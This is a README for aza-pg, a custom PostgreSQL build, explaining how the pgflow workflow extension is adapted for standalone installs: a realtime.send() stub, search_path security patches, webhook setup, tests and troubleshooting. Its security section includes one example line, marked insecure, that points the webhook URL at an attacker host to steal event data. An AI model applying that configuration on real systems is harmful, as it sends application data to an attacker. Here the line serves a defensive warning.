# pgflow v0.13.1 - Supabase Compatibility Layer

This document describes how pgflow (Supabase's workflow orchestration extension) is integrated into aza-pg custom PostgreSQL builds.

## Overview

**pgflow** is designed for Supabase Cloud and expects:

- Supabase Realtime API for event broadcasting
- Supabase Vault for credential storage
- Supabase-specific PostgreSQL settings

**aza-pg** provides a compatibility layer that enables pgflow to work in standalone PostgreSQL installations without Supabase infrastructure.

## Architecture

### Components

1. **realtime.send() Stub** (`04a-pgflow-realtime-stub.sh`)
   - Replaces Supabase Realtime API with PostgreSQL native features
   - 3-layer event broadcasting: pg_notify + pgmq (optional) + pg_net webhooks (optional)
   - Installed in `template1` database - all new databases inherit it automatically

2. **Security Patches** (`docker/postgres/pgflow/security-patches.sql`)
   - Fixes search_path hijacking vulnerabilities (AZA-PGFLOW-001, AZA-PGFLOW-002)
   - Adapts is_local() for non-Supabase environments (COMPAT-AZA-PG-001)
   - Applied at runtime after pgflow schema loads

3. **Custom Installation Marker** (`00-aza-pg-settings.sh`)
   - Sets `app.aza_pg_custom = 'true'` system-wide
   - Used by is_local() to detect custom installations

## Installation

### Initial Database

pgflow is automatically installed during container initialization:

```bash
docker run -e POSTGRES_PASSWORD=secret ghcr.io/fluxo-kt/aza-pg:pg18
# pgflow schema + patches loaded automatically
```

### New Databases

The `realtime.send()` stub is inherited from `template1`:

```sql
-- Create new database with pgflow support
CREATE DATABASE my_app TEMPLATE template1;

-- Install pgflow schema
\c my_app
\i /opt/pgflow/schema.sql
\i /opt/pgflow/security-patches.sql
```

Test that it works:

```sql
SELECT pgflow.is_local();  -- Should return: t (true)
```

## Event Broadcasting

### Layer 1: PostgreSQL LISTEN/NOTIFY (Always Active)

```sql
-- Application listens for events
LISTEN pgflow_events;

-- pgflow triggers workflow, realtime.send() broadcasts
-- Clients receive notification immediately
```

**Use Case**: Real-time updates in single-server deployments

### Layer 2: pgmq Queue (Optional)

Enable reliable queue delivery:

```sql
ALTER SYSTEM SET realtime.pgmq_enabled = 'true';
SELECT pg_reload_conf();
```

pgflow events are now also queued in `pgflow_events` queue for asynchronous processing:

```sql
-- Consumer processes events from queue
SELECT * FROM pgmq.read('pgflow_events', 10, 30);
```

**Use Case**: Decoupled event processing, guaranteed delivery

### Layer 3: HTTP Webhooks (Optional)

Configure webhook endpoint:

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://your-api.example.com/pgflow-events';
SELECT pg_reload_conf();
```

pgflow events are now POSTed to the configured URL:

```json
POST https://your-api.example.com/pgflow-events
Content-Type: application/json

{
  "payload": { ... },
  "event": "flow:started",
  "topic": "workflow_123",
  "timestamp": 1705123456.789,
  "private": false
}
```

**Use Case**: Integration with external systems, microservices architecture

## Security

### SSRF Protection

`realtime.send()` is protected against Server-Side Request Forgery (SSRF) attacks:

```sql
-- PUBLIC execution is revoked by default
REVOKE EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) FROM PUBLIC;

-- Only postgres superuser has access
-- Application roles must be explicitly granted
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

**Rationale**: Prevents unprivileged users from manipulating `realtime.webhook_url` to trigger arbitrary HTTP requests from the database server.

### Webhook URL Management

**✅ SECURE**: System-level configuration (persistent across sessions)

```sql
ALTER SYSTEM SET realtime.webhook_url = 'https://trusted-api.internal/events';
SELECT pg_reload_conf();
```

**❌ INSECURE**: Session-level configuration (can be hijacked by attackers)

```sql
SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
```

**Best Practice**: Only administrators should configure webhook URLs via `ALTER SYSTEM`.

### Security Patches Applied

| Identifier            | Component                | Issue                   | Fix                                   |
| --------------------- | ------------------------ | ----------------------- | ------------------------------------- |
| **AZA-PGFLOW-001**    | get_run_with_states()    | search_path hijacking   | Added `SET search_path = ''`          |
| **AZA-PGFLOW-002**    | start_flow_with_states() | search_path hijacking   | Added `SET search_path = ''`          |
| **COMPAT-AZA-PG-001** | is_local()               | Supabase-only detection | Check for `app.aza_pg_custom` setting |

## Upstream Tracking

These are **local patches** for compatibility and security. They are tracked internally but not official CVE entries.

**Status**: Pending upstream review  
**Issue**: To be filed at https://github.com/pgflow-dev/pgflow/issues

When upstream publishes fixes, we can:

1. Validate fixes match our patches
2. Remove local patches
3. Upgrade to fixed upstream version

## Testing

### Verify Installation

```sql
-- Check realtime.send() exists
SELECT proname, pronargs
FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';

-- Check pgflow schema
SELECT COUNT(*) FROM pgflow.flows;

-- Test is_local() detection
SELECT pgflow.is_local();  -- Should return: t
```

### Test Event Broadcasting

```sql
-- Start a LISTEN session
LISTEN pgflow_events;

-- Trigger a test event
SELECT realtime.send(
  '{"test": "value"}'::jsonb,
  'test:event',
  'test_topic',
  false
);

-- You should receive a notification:
-- Asynchronous notification "pgflow_events" with payload "{...}" received
```

### Automated Tests

Run comprehensive test suite:

```bash
# Test pgflow installation and security patches
bun run scripts/test/test-pgflow-security.ts

# Test new database functionality
bun run scripts/test/test-pgflow-new-database.ts
```

## Troubleshooting

### Issue: pgflow schema fails to load

**Symptoms**:

```
ERROR:  function realtime.send() does not exist
```

**Solution**: Verify realtime stub was installed:

```sql
SELECT COUNT(*) FROM pg_proc p
JOIN pg_namespace n ON p.pronamespace = n.oid
WHERE n.nspname = 'realtime' AND proname = 'send';
-- Should return: 1
```

If missing, run `04a-pgflow-realtime-stub.sh` manually.

### Issue: is_local() returns false

**Symptoms**:

```sql
SELECT pgflow.is_local();
-- Returns: f (false)
```

**Solution**: Verify custom installation marker:

```sql
SELECT current_setting('app.aza_pg_custom');
-- Should return: true
```

If not set, run `00-aza-pg-settings.sh` manually.

### Issue: Permission denied on realtime.send()

**Symptoms**:

```
ERROR:  permission denied for function send
```

**Solution**: Grant EXECUTE permission to your application role:

```sql
GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
```

### Issue: Webhook not firing

**Checklist**:

1. Is webhook URL configured? `SHOW realtime.webhook_url;`
2. Is pg_net extension loaded? `SELECT * FROM pg_extension WHERE extname = 'pg_net';`
3. Check pg_net logs: `SELECT * FROM net._http_response ORDER BY id DESC LIMIT 10;`
4. Verify network connectivity from database server to webhook endpoint

## Version Compatibility

| aza-pg Version | pgflow Version | PostgreSQL | Notes                  |
| -------------- | -------------- | ---------- | ---------------------- |
| 18.1-202501xx  | 0.13.1         | 18.1       | Initial integration    |
| Future         | 0.14.x         | 18.x       | Pending upstream fixes |

## Performance Considerations

### pg_notify

- **Latency**: <1ms (immediate)
- **Throughput**: 1000s/sec
- **Persistence**: None (in-memory only)
- **Best For**: Real-time UI updates, single-server deployments

### pgmq

- **Latency**: ~10ms (queue write)
- **Throughput**: 100s-1000s/sec
- **Persistence**: Durable (table-backed)
- **Best For**: Reliable event processing, work queues

### pg_net Webhooks

- **Latency**: ~50-500ms (HTTP round-trip)
- **Throughput**: 10s-100s/sec
- **Persistence**: Best-effort (no retry on failure)
- **Best For**: External system integration, audit trails

## References

- pgflow Documentation: https://github.com/pgflow-dev/pgflow
- Supabase Realtime: https://supabase.com/docs/guides/realtime
- PostgreSQL LISTEN/NOTIFY: https://www.postgresql.org/docs/current/sql-notify.html
- pgmq Extension: https://github.com/tembo-io/pgmq
- pg_net Extension: https://github.com/supabase/pg_net

## Contributing

Found a bug or have a suggestion? Please file an issue at:
https://github.com/fluxo-kt/aza-pg/issues

When reporting pgflow issues, include:

- aza-pg image version
- pgflow version (`SELECT * FROM pgflow.migrations`)
- Error message and stack trace
- Steps to reproduce
